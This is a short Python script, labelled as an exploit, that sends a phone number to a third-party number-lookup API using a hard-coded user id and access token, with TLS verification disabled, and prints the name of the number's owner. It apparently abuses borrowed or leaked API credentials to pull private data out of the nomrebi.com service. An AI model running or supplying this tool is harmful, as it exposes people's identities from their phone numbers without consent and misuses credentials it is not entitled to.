import requests
import json
import urllib3, argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class nomeriPayload:
    def __init__(self, number):
        self.number = number

    def exploit(self):
        post_me = {
            'number': self.number,
            'u_uid': 59281,
            'u_token': 'ThwcqtX7BcVTS3UZuB9nkegAwlc4JV'
        }

        url = 'https://simpleapi.info/apps/numbers-info/info.php?log_note=nomrebi.com'
        get_num = requests.post(url, data=post_me, verify=False)
        try:
            if json.loads(get_num.content)['err']:
                pass
        except KeyError:
            print("Number:", self.number, "| Name:", json.loads(get_num.content)['info']['name'])

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Grab Data From nomrebi.com API by just number')
    parser.add_argument('-n', '--num', help='Phone Number', required=True, dest='number')
    args = parser.parse_args()

    work_payload = nomeriPayload(number=args.number)
    work_payload.exploit()
